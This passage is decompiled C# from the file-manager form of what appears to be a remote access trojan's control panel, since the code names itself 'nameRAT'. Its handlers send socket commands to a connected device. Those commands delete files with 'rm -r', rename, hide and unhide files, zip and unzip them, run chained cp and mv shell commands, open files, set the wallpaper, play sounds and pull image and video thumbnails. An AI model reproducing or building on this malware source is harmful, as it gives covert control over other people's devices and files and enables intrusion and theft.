			if (this.DGV0.SelectedRows.Count > 0)
			{
				int num = this.DGV0.SelectedRows.Count - 1;
				for (int i = num; i >= 0; i += -1)
				{
					string left = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag);
					string text = "del0";
					string text2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value));
					if (Operators.CompareString(left, "0", false) == 0)
					{
						text = "del1";
						string prm = text2;
						text2 = "rm -r" + Strings.Space(1) + this.Format_Space(prm);
					}
					if (this.classClient != null)
					{
						object[] parametersObjects = new object[]
						{
							this.Client,
							string.Concat(new string[]
							{
								SecurityKey.KeysClient1,
								Data.SPL_SOCKET,
								reso.domen,
								".files",
								Data.SPL_SOCKET,
								"method",
								Data.SPL_SOCKET,
								SecurityKey.resultClient,
								Data.SPL_SOCKET,
								text,
								Data.SPL_DATA,
								text2
							}),
							Codes.Encoding().GetBytes("null"),
							this.classClient
						};
						this.classClient.SendMessage(parametersObjects);
						if (Operators.CompareString(left, "back", false) != 0)
						{
							this.DGV0.Rows.RemoveAt(this.DGV0.SelectedRows[i].Index);
						}
					}
				}
			}
		}
	}

	// Token: 0x06000579 RID: 1401 RVA: 0x0008C434 File Offset: 0x0008A634
	private void EditToolStripMenuItem_Click(object sender, EventArgs e)
	{
		checked
		{
			if (this.DGV0.SelectedRows.Count > 0)
			{
				int num = this.DGV0.SelectedRows.Count - 1;
				for (int i = num; i >= 0; i += -1)
				{
					string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value));
					string left = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag);
					if (Operators.CompareString(left, "1", false) == 0)
					{
						object objectValue = RuntimeHelpers.GetObjectValue(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[2].Tag);
						if (!Operators.ConditionalCompareObjectLessEqual(objectValue, 512000, false))
						{
							Interaction.MsgBox(string.Format(this.FSize, RuntimeHelpers.GetObjectValue(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[2].Value), RuntimeHelpers.GetObjectValue(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value)), MsgBoxStyle.Critical, reso.nameRAT);
						}
						else if (this.classClient != null)
						{
							object[] parametersObjects = new object[]
							{
								this.Client,
								string.Concat(new string[]
								{
									SecurityKey.KeysClient1,
									Data.SPL_SOCKET,
									reso.domen,
									".files",
									Data.SPL_SOCKET,
									"method",
									Data.SPL_SOCKET,
									SecurityKey.editor,
									Data.SPL_SOCKET,
									"edit",
									Data.SPL_DATA,
									text
								}),
								Codes.Encoding().GetBytes("null"),
								this.classClient
							};
							this.classClient.SendMessage(parametersObjects);
						}
					}
				}
			}
		}
	}

	// Token: 0x0600057A RID: 1402 RVA: 0x0008C6D0 File Offset: 0x0008A8D0
	private void ZipToolStripMenuItem_Click(object sender, EventArgs e)
	{
		checked
		{
			if (this.classClient != null)
			{
				inp inp = new inp();
				inp.Text = "Zip";
				inp.LTitle.Text = "File Name";
				inp.InputText.Text = "new file.zip";
				inp.StartPosition = FormStartPosition.Manual;
				inp.Location = Codes.FixSize(this, inp);
				StringBuilder stringBuilder = new StringBuilder();
				DialogResult dialogResult = inp.ShowDialog(this);
				if (dialogResult == DialogResult.OK && this.classClient != null && this.DGV0.SelectedRows.Count > 0)
				{
					string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), inp.InputText.Text));
					int num = this.DGV0.SelectedRows.Count - 1;
					for (int i = num; i >= 0; i += -1)
					{
						string left = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag);
						if (Operators.CompareString(left, "1", false) == 0)
						{
							string str = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value));
							stringBuilder.Append(str + Data.SPL_LINE);
						}
					}
					if (stringBuilder.ToString().Length > 0)
					{
						object[] parametersObjects = new object[]
						{
							this.Client,
							string.Concat(new string[]
							{
								SecurityKey.KeysClient1,
								Data.SPL_SOCKET,
								reso.domen,
								".files",
								Data.SPL_SOCKET,
								"method",
								Data.SPL_SOCKET,
								SecurityKey.resultClient,
								Data.SPL_SOCKET,
								"zip",
								Data.SPL_DATA,
								stringBuilder.ToString(),
								Data.SPL_DATA,
								text
							}),
							Codes.Encoding().GetBytes("null"),
							this.classClient
						};
						this.classClient.SendMessage(parametersObjects);
					}
				}
				inp.Close();
			}
		}
	}

	// Token: 0x0600057B RID: 1403 RVA: 0x0008C950 File Offset: 0x0008AB50
	private void UnZipToolStripMenuItem_Click(object sender, EventArgs e)
	{
		checked
		{
			if (this.DGV0.SelectedRows.Count > 0)
			{
				int num = this.DGV0.SelectedRows.Count - 1;
				for (int i = num; i >= 0; i += -1)
				{
					string left = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag);
					if (Operators.CompareString(left, "1", false) == 0)
					{
						string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value));
						string text2 = Conversions.ToString(Operators.ConcatenateObject(this.DGV0.Tag, "/"));
						if (this.classClient != null)
						{
							object[] parametersObjects = new object[]
							{
								this.Client,
								string.Concat(new string[]
								{
									SecurityKey.KeysClient1,
									Data.SPL_SOCKET,
									reso.domen,
									".files",
									Data.SPL_SOCKET,
									"method",
									Data.SPL_SOCKET,
									SecurityKey.resultClient,
									Data.SPL_SOCKET,
									"unzip",
									Data.SPL_DATA,
									text,
									Data.SPL_DATA,
									text2
								}),
								Codes.Encoding().GetBytes("null"),
								this.classClient
							};
							this.classClient.SendMessage(parametersObjects);
						}
					}
				}
			}
		}
	}

	// Token: 0x0600057C RID: 1404 RVA: 0x0008CB2C File Offset: 0x0008AD2C
	private void RenameToolStripMenuItem_Click(object sender, EventArgs e)
	{
		checked
		{
			if (this.classClient != null && this.DGV0.SelectedRows.Count == 1)
			{
				inp inp = new inp();
				inp.Text = "Rename";
				inp.LTitle.Text = "new Name";
				inp.StartPosition = FormStartPosition.Manual;
				inp.Location = Codes.FixSize(this, inp);
				int num = this.DGV0.SelectedRows.Count - 1;
				for (int i = num; i >= 0; i += -1)
				{
					inp.InputText.Text = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value);
				}
				DialogResult dialogResult = inp.ShowDialog(this);
				if (dialogResult == DialogResult.OK && this.classClient != null && this.DGV0.SelectedRows.Count == 1)
				{
					int num2 = this.DGV0.SelectedRows.Count - 1;
					for (int j = num2; j >= 0; j += -1)
					{
						string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), this.DGV0.Rows[this.DGV0.SelectedRows[j].Index].Cells[1].Value));
						string text2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), inp.InputText.Text));
						if (Operators.CompareString(text, text2, false) != 0)
						{
							object[] parametersObjects = new object[]
							{
								this.Client,
								string.Concat(new string[]
								{
									SecurityKey.KeysClient1,
									Data.SPL_SOCKET,
									reso.domen,
									".files",
									Data.SPL_SOCKET,
									"method",
									Data.SPL_SOCKET,
									SecurityKey.resultClient,
									Data.SPL_SOCKET,
									"rename",
									Data.SPL_DATA,
									text,
									Data.SPL_DATA,
									text2
								}),
								Codes.Encoding().GetBytes("null"),
								this.classClient
							};
							this.classClient.SendMessage(parametersObjects);
						}
					}
				}
				inp.Close();
			}
		}
	}

	// Token: 0x0600057D RID: 1405 RVA: 0x0008CDB8 File Offset: 0x0008AFB8
	private void HideToolStripMenuItem_Click(object sender, EventArgs e)
	{
		checked
		{
			if (this.DGV0.SelectedRows.Count > 0)
			{
				int num = this.DGV0.SelectedRows.Count - 1;
				for (int i = num; i >= 0; i += -1)
				{
					if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag, "back", false))))
					{
						string text = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value);
						if (text.Trim()[0] != '.')
						{
							string text2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/."), text));
							string text3 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), text));
							if (this.classClient != null)
							{
								object[] parametersObjects = new object[]
								{
									this.Client,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient1,
										Data.SPL_SOCKET,
										reso.domen,
										".files",
										Data.SPL_SOCKET,
										"method",
										Data.SPL_SOCKET,
										SecurityKey.resultClient,
										Data.SPL_SOCKET,
										"rename",
										Data.SPL_DATA,
										text3,
										Data.SPL_DATA,
										text2
									}),
									Codes.Encoding().GetBytes("null"),
									this.classClient
								};
								this.classClient.SendMessage(parametersObjects);
							}
						}
					}
				}
			}
		}
	}

	// Token: 0x0600057E RID: 1406 RVA: 0x0008CFBC File Offset: 0x0008B1BC
	private void ShowToolStripMenuItem_Click(object sender, EventArgs e)
	{
		checked
		{
			if (this.DGV0.SelectedRows.Count > 0)
			{
				int num = this.DGV0.SelectedRows.Count - 1;
				bool flag = false;
				for (int i = num; i >= 0; i += -1)
				{
					if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag, "back", false))))
					{
						string text = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value);
						if (text.Trim()[0] == '.')
						{
							string text2 = null;
							int num2 = text.Length - 1;
							for (int j = 0; j <= num2; j++)
							{
								if (text.Trim()[j] != '.')
								{
									text2 += Conversions.ToString(text.Trim()[j]);
									flag = true;
								}
								else if (flag)
								{
									text2 += Conversions.ToString(text.Trim()[j]);
								}
							}
							flag = false;
							string text3 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), text2));
							string text4 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), text));
							if (this.classClient != null)
							{
								object[] parametersObjects = new object[]
								{
									this.Client,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient1,
										Data.SPL_SOCKET,
										reso.domen,
										".files",
										Data.SPL_SOCKET,
										"method",
										Data.SPL_SOCKET,
										SecurityKey.resultClient,
										Data.SPL_SOCKET,
										"rename",
										Data.SPL_DATA,
										text4,
										Data.SPL_DATA,
										text3
									}),
									Codes.Encoding().GetBytes("null"),
									this.classClient
								};
								this.classClient.SendMessage(parametersObjects);
							}
						}
					}
				}
			}
		}
	}

	// Token: 0x0600057F RID: 1407 RVA: 0x0008D240 File Offset: 0x0008B440
	private void AddFilesToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			inp inp = new inp();
			inp.Text = "Add Files";
			inp.LTitle.Text = "New name";
			inp.StartPosition = FormStartPosition.Manual;
			inp.Location = Codes.FixSize(this, inp);
			inp.BOXX.Visible = true;
			DialogResult dialogResult = inp.ShowDialog(this);
			if (dialogResult == DialogResult.OK && this.classClient != null)
			{
				bool @checked = inp.CheckFolder.Checked;
				bool checked2 = inp.CheckHidden.Checked;
				string text = inp.InputText.Text;
				if (checked2)
				{
					text = "." + text;
				}
				string text2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), text));
				object[] parametersObjects = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient1,
						Data.SPL_SOCKET,
						reso.domen,
						".files",
						Data.SPL_SOCKET,
						"method",
						Data.SPL_SOCKET,
						SecurityKey.resultClient,
						Data.SPL_SOCKET,
						"create",
						Data.SPL_DATA,
						text2,
						Data.SPL_DATA,
						Conversions.ToString(@checked)
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects);
			}
			inp.Close();
		}
	}

	// Token: 0x06000580 RID: 1408 RVA: 0x0008D3D8 File Offset: 0x0008B5D8
	private void OpenToolStripMenuItem_Click(object sender, EventArgs e)
	{
		checked
		{
			if (this.DGV0.SelectedRows.Count > 0)
			{
				int num = this.DGV0.SelectedRows.Count - 1;
				for (int i = num; i >= 0; i += -1)
				{
					string left = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag);
					if (Operators.CompareString(left, "1", false) == 0)
					{
						string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value));
						if (this.classClient != null)
						{
							string text2 = "null";
							if (text.Contains(".") & !text.EndsWith("."))
							{
								text2 = text.Substring(text.LastIndexOf(".") + 1);
							}
							object[] parametersObjects = new object[]
							{
								this.Client,
								string.Concat(new string[]
								{
									SecurityKey.KeysClient1,
									Data.SPL_SOCKET,
									reso.domen,
									".files",
									Data.SPL_SOCKET,
									"method",
									Data.SPL_SOCKET,
									SecurityKey.resultClient,
									Data.SPL_SOCKET,
									"open",
									Data.SPL_DATA,
									text,
									Data.SPL_DATA,
									text2
								}),
								Codes.Encoding().GetBytes("null"),
								this.classClient
							};
							this.classClient.SendMessage(parametersObjects);
						}
					}
				}
			}
		}
	}

	// Token: 0x06000581 RID: 1409 RVA: 0x0008D5D4 File Offset: 0x0008B7D4
	private bool ISupportedText(string t)
	{
		bool result;
		if (t.Contains("."))
		{
			string value = "\"" + t.Substring(t.LastIndexOf(".")) + "\"";
			result = reso.SupportedText.Contains(value);
		}
		else
		{
			result = false;
		}
		return result;
	}

	// Token: 0x06000582 RID: 1410 RVA: 0x0008D628 File Offset: 0x0008B828
	private bool ISupportedImages(string t)
	{
		bool result;
		if (t.Contains("."))
		{
			string value = "\"" + t.Substring(t.LastIndexOf(".")) + "\"";
			result = reso.SupportedImages.Contains(value);
		}
		else
		{
			result = false;
		}
		return result;
	}

	// Token: 0x06000583 RID: 1411 RVA: 0x0008D67C File Offset: 0x0008B87C
	private bool ISupportedVideo(string t)
	{
		bool result;
		if (t.Contains("."))
		{
			string value = "\"" + t.Substring(t.LastIndexOf(".")) + "\"";
			result = reso.SupportedVideo.Contains(value);
		}
		else
		{
			result = false;
		}
		return result;
	}

	// Token: 0x06000584 RID: 1412 RVA: 0x0008D6D0 File Offset: 0x0008B8D0
	private void TOpacity_Tick(object sender, EventArgs e)
	{
		if (base.Opacity != 1.0)
		{
			base.Opacity += 0.1;
		}
		else
		{
			this.TOpacity.Enabled = false;
		}
	}

	// Token: 0x06000585 RID: 1413 RVA: 0x0008D718 File Offset: 0x0008B918
	private void DGV0_SelectionChanged(object sender, EventArgs e)
	{
		checked
		{
			try
			{
				if (this.DGV0.SelectedRows.Count == 1)
				{
					int num = this.DGV0.SelectedRows.Count - 1;
					for (int num2 = num; num2 >= 0; num2 += -1)
					{
						string left = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[num2].Index].Cells[0].Tag);
						if (Operators.CompareString(left, "1", false) == 0)
						{
							string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), this.DGV0.Rows[this.DGV0.SelectedRows[num2].Index].Cells[1].Value));
							bool flag = false;
							this.FileDirectory = Conversions.ToString(Operators.ConcatenateObject(this.classClient.FolderUSER + "\\Thumbs", NewLateBinding.LateGet(this.DGV0.Tag, null, "Replace", new object[]
							{
								"/",
								"\\"
							}, null, null, null)));
							if (text.Substring(text.LastIndexOf("/") + 1).EndsWith(".mp4"))
							{
								string text2 = text.Substring(text.LastIndexOf("/") + 1);
								if (this.thumb_chk.Checked && Directory.Exists(this.FileDirectory + "\\" + text2.Replace(".mp4", "")))
								{
									using (IEnumerator<string> enumerator = MyProject.Computer.FileSystem.GetFiles(this.FileDirectory + "\\" + text2.Replace(".mp4", "")).GetEnumerator())
									{
										if (enumerator.MoveNext())
										{
											string file = enumerator.Current;
											FileInfo fileInfo = MyProject.Computer.FileSystem.GetFileInfo(file);
											this.viwimage.Image = Codes.ReadBitmapFromFile(string.Concat(new string[]
											{
												this.FileDirectory,
												"\\",
												text2.Replace(".mp4", ""),
												"\\",
												fileInfo.Name
											}));
											this.viwimage.Visible = true;
											flag = true;
										}
									}
								}
							}
							if (flag)
							{
								break;
							}
							if (this.thumb_chk.Checked && Directory.Exists(this.FileDirectory) && File.Exists(this.FileDirectory + "\\" + text.Substring(text.LastIndexOf("/") + 1)))
							{
								try
								{
									if (this.viwimage.Image != null)
									{
										this.viwimage.Image.Dispose();
										this.viwimage.Image = null;
									}
									goto IL_4FD;
								}
								catch (Exception)
								{
									goto IL_4FD;
								}
								goto IL_304;
								IL_4FD:
								this.viwimage.Image = Codes.ReadBitmapFromFile(this.FileDirectory + "\\" + text.Substring(text.LastIndexOf("/") + 1));
								this.viwimage.Visible = true;
								flag = true;
							}
							IL_304:
							if (flag)
							{
								break;
							}
							string text3 = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[num2].Index].Cells[1].Value);
							object obj = this.ISupportedImages(text3.ToLower()) ? "false" : ((!this.ISupportedVideo(text3.ToLower())) ? "null" : "true");
							if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(obj, "null", false))) && this.classClient != null)
							{
								string[] array = this.classClient.Keys.Split(new char[]
								{
									':'
								});
								object[] parametersObjects = new object[]
								{
									this.Client,
									Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(string.Concat(new string[]
									{
										SecurityKey.KeysClient1,
										Data.SPL_SOCKET,
										reso.domen,
										".files",
										Data.SPL_SOCKET,
										"method",
										Data.SPL_SOCKET,
										SecurityKey.resultClient,
										Data.SPL_SOCKET,
										"small",
										Data.SPL_DATA,
										array[0],
										Data.SPL_DATA,
										array[1],
										Data.SPL_DATA,
										text,
										Data.SPL_DATA
									}), obj), Data.SPL_DATA), this.Q), Data.SPL_DATA), SecurityKey.ImageViewer), "File" + this.classClient.UUID),
									Codes.Encoding().GetBytes("null"),
									this.classClient
								};
								this.classClient.SendMessage(parametersObjects);
							}
						}
						else
						{
							this.viwimage.Image = null;
						}
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000586 RID: 1414 RVA: 0x0008DCBC File Offset: 0x0008BEBC
	private void Sub_Clipboard(string pram)
	{
		checked
		{
			if (Operators.CompareString(pram, "'PASTE'", false) == 0 & this.Clipboard.Count > 0)
			{
				string right = this.Format_Space(Conversions.ToString(this.DGV0.Tag));
				string text = "";
				foreach (Array array in this.Clipboard)
				{
					Array instance = array;
					text = ((text.Length == 0) ? Conversions.ToString(Operators.ConcatenateObject(text, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(NewLateBinding.LateIndexGet(instance, new object[]
					{
						3
					}, null), Strings.Space(1)), NewLateBinding.LateIndexGet(instance, new object[]
					{
						2
					}, null)), Strings.Space(1)), right))) : Conversions.ToString(Operators.ConcatenateObject(text, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Strings.Space(1) + "&&" + Strings.Space(1), NewLateBinding.LateIndexGet(instance, new object[]
					{
						3
					}, null)), Strings.Space(1)), NewLateBinding.LateIndexGet(instance, new object[]
					{
						2
					}, null)), Strings.Space(1)), right))));
				}
				object[] parametersObjects = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient1,
						Data.SPL_SOCKET,
						reso.domen,
						".files",
						Data.SPL_SOCKET,
						"method",
						Data.SPL_SOCKET,
						SecurityKey.resultClient,
						Data.SPL_SOCKET,
						"commend",
						Data.SPL_DATA,
						text
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects);
				this.Clipboard.Clear();
			}
			else
			{
				this.Clipboard.Clear();
				if (this.DGV0.SelectedRows.Count > 0)
				{
					int num = this.DGV0.SelectedRows.Count - 1;
					for (int i = num; i >= 0; i += -1)
					{
						string left = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag);
						if (Operators.CompareString(left, "back", false) != 0)
						{
							string prm = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value));
							bool flag = Operators.CompareString(left, "1", false) == 0;
							if (Operators.CompareString(pram, "'COPY'", false) == 0)
							{
								if (flag)
								{
									this.Clipboard.Add(new object[]
									{
										pram,
										flag,
										this.Format_Space(prm),
										"cp"
									});
								}
								else
								{
									this.Clipboard.Add(new object[]
									{
										pram,
										flag,
										this.Format_Space(prm),
										"cp -R"
									});
								}
							}
							else
							{
								this.Clipboard.Add(new object[]
								{
									pram,
									flag,
									this.Format_Space(prm),
									"mv"
								});
							}
						}
					}
				}
			}
		}
	}

	// Token: 0x06000587 RID: 1415 RVA: 0x0008E0B0 File Offset: 0x0008C2B0
	private string Format_Space(string prm)
	{
		if (prm.Contains(Strings.Space(1)))
		{
			prm = prm.Replace(Strings.Space(1), "(U+0020)".ToLower());
		}
		return prm;
	}

	// Token: 0x06000588 RID: 1416 RVA: 0x00002D83 File Offset: 0x00000F83
	private void CutToolStripMenuItem_Click(object sender, EventArgs e)
	{
		this.Sub_Clipboard("'CUT'");
	}

	// Token: 0x06000589 RID: 1417 RVA: 0x00002D90 File Offset: 0x00000F90
	private void CopyToolStripMenuItem_Click(object sender, EventArgs e)
	{
		this.Sub_Clipboard("'COPY'");
	}

	// Token: 0x0600058A RID: 1418 RVA: 0x0008E0E8 File Offset: 0x0008C2E8
	private void PasteToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (this.Clipboard.Count != 0)
		{
			this.Sub_Clipboard("'PASTE'");
		}
	}

	// Token: 0x0600058B RID: 1419 RVA: 0x0008E110 File Offset: 0x0008C310
	private void SetWallpaperToolStripMenuItem_Click(object sender, EventArgs e)
	{
		checked
		{
			if (this.DGV0.SelectedRows.Count > 0)
			{
				int num = this.DGV0.SelectedRows.Count - 1;
				for (int i = num; i >= 0; i += -1)
				{
					if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag, "back", false))))
					{
						string right = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value);
						string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), right));
						if (this.classClient != null)
						{
							object[] parametersObjects = new object[]
							{
								this.Client,
								string.Concat(new string[]
								{
									SecurityKey.KeysClient1,
									Data.SPL_SOCKET,
									reso.domen,
									".files",
									Data.SPL_SOCKET,
									"method",
									Data.SPL_SOCKET,
									SecurityKey.resultClient,
									Data.SPL_SOCKET,
									"set_wallpaper",
									Data.SPL_DATA,
									text
								}),
								Codes.Encoding().GetBytes("null"),
								this.classClient
							};
							this.classClient.SendMessage(parametersObjects);
						}
					}
				}
			}
		}
	}

	// Token: 0x0600058C RID: 1420 RVA: 0x0008E2C8 File Offset: 0x0008C4C8
	private void PlaySoundToolStripMenuItem_Click(object sender, EventArgs e)
	{
		checked
		{
			if (this.DGV0.SelectedRows.Count > 0)
			{
				int num = this.DGV0.SelectedRows.Count - 1;
				for (int i = num; i >= 0; i += -1)
				{
					if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag, "back", false))))
					{
						string right = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value);
						string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), right));
						if (this.classClient != null)
						{
							object[] parametersObjects = new object[]
							{
								this.Client,
								string.Concat(new string[]
								{
									SecurityKey.KeysClient1,
									Data.SPL_SOCKET,
									reso.domen,
									".files",
									Data.SPL_SOCKET,
									"method",
									Data.SPL_SOCKET,
									SecurityKey.resultClient,
									Data.SPL_SOCKET,
									"play_back",
									Data.SPL_DATA,
									text
								}),
								Codes.Encoding().GetBytes("null"),
								this.classClient
							};
							this.classClient.SendMessage(parametersObjects);
						}
					}
				}
			}
		}
	}

	// Token: 0x0600058D RID: 1421 RVA: 0x0008E480 File Offset: 0x0008C680
	private void ctxMenu_Opening(object sender, CancelEventArgs e)
	{
		string left = this.ver;
		if (Operators.CompareString(left, "v1.0", false) != 0)
		{
			this.SetWallpaperToolStripMenuItem.Visible = true;
		}
		else
		{
			this.SetWallpaperToolStripMenuItem.Visible = false;
		}
	}

	// Token: 0x0600058E RID: 1422 RVA: 0x0008E4C0 File Offset: 0x0008C6C0
	private void FileManager_FormClosing(object sender, FormClosingEventArgs e)
	{
		if (this.DGVDATA.Rows.Count > 0)
		{
			int num = 0;
			foreach (object obj in ((IEnumerable)this.DGVDATA.Rows))
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
				if (dataGridViewRow.Tag.ToString().Length > 1 && Operators.CompareString(dataGridViewRow.Tag.ToString(), "x", false) != 0)
				{
					num = 1;
					break;
				}
			}
			if (num > 0)
			{
				try
				{
					if (!Codes.MyMsgBox("Downloads", "Some Downloads is Running :\r\nStop Active Downloads...?", true, Resources.warning48px))
					{
						e.Cancel = true;
						return;
					}
				}
				catch (Exception)
				{
				}
			}
		}
		this.Timer1.Stop();
		this.Timer2.Stop();
		this.Correntindex = 1;
		checked
		{
			int num2 = this.DownStreams.Count - 1;
			for (int num3 = 0; num3 <= num2; num3++)
			{
				try
				{
					if (this.DownStreams[num3] != null)
					{
						object objectValue = RuntimeHelpers.GetObjectValue(this.DownStreams[num3]);
						FileStream fileStream = (FileStream)NewLateBinding.LateIndexGet(objectValue, new object[]
						{
							0
						}, null);
						if (fileStream != null)
						{
							fileStream.Dispose();
							fileStream.Close();
						}
					}
				}
				catch (Exception)
				{
				}
			}
		}
	}

	// Token: 0x0600058F RID: 1423 RVA: 0x0008E654 File Offset: 0x0008C854
	private void Pathtxt_SizeChanged(object sender, EventArgs e)
	{
		try
		{
			this.PB.Size = this.pathtxt.Size;
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x06000590 RID: 1424 RVA: 0x0008E68C File Offset: 0x0008C88C
	private void LoadVideo()
	{
		checked
		{
			if (this.DGV0.SelectedRows.Count == 1)
			{
				int num = this.DGV0.SelectedRows.Count - 1;
				for (int i = num; i >= 0; i += -1)
				{
					string left = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag);
					if (Operators.CompareString(left, "1", false) == 0)
					{
						string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value));
						this.FileDirectory = Conversions.ToString(Operators.ConcatenateObject(this.classClient.FolderUSER + "\\Thumbs", NewLateBinding.LateGet(this.DGV0.Tag, null, "Replace", new object[]
						{
							"/",
							"\\"
						}, null, null, null)));
						if (text.Substring(text.LastIndexOf("/") + 1).EndsWith(".mp4"))
						{
							this.ShowVideo = true;
							this.thumb_chk.Checked = false;
							this.thumb_chk.Refresh();
							string text2 = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value);
							object obj = this.ISupportedImages(text2.ToLower()) ? "false" : ((!this.ISupportedVideo(text2.ToLower())) ? "null" : "true");
							if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(obj, "null", false))) && this.classClient != null)
							{
								string[] array = this.classClient.Keys.Split(new char[]
								{
									':'
								});
								object[] parametersObjects = new object[]
								{
									this.Client,
									Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(string.Concat(new string[]
									{
										SecurityKey.KeysClient1,
										Data.SPL_SOCKET,
										reso.domen,
										".files",
										Data.SPL_SOCKET,
										"method",
										Data.SPL_SOCKET,
										SecurityKey.resultClient,
										Data.SPL_SOCKET,
										"small",
										Data.SPL_DATA,
										array[0],
										Data.SPL_DATA,
										array[1],
										Data.SPL_DATA,
										text,
										Data.SPL_DATA
									}), obj), Data.SPL_DATA), this.Q), Data.SPL_DATA), SecurityKey.ImageViewer), "File" + this.classClient.UUID),
									Codes.Encoding().GetBytes("null"),
									this.classClient
								};
								this.classClient.SendMessage(parametersObjects);
							}
						}
					}
					else
					{
						this.viwimage.Image = null;
					}
				}
			}
		}
	}

	// Token: 0x06000591 RID: 1425 RVA: 0x0000206C File Offset: 0x0000026C
	private void Viwimage_MouseUp(object sender, MouseEventArgs e)
	{
	}

	// Token: 0x06000592 RID: 1426 RVA: 0x00002D9D File Offset: 0x00000F9D
	private void Viwimage_MouseLeave(object sender, EventArgs e)
	{
		this.ShowVideo = false;
		this.thumb_chk.Checked = true;
		this.thumb_chk.Refresh();
	}

	// Token: 0x06000593 RID: 1427 RVA: 0x0008EA04 File Offset: 0x0008CC04
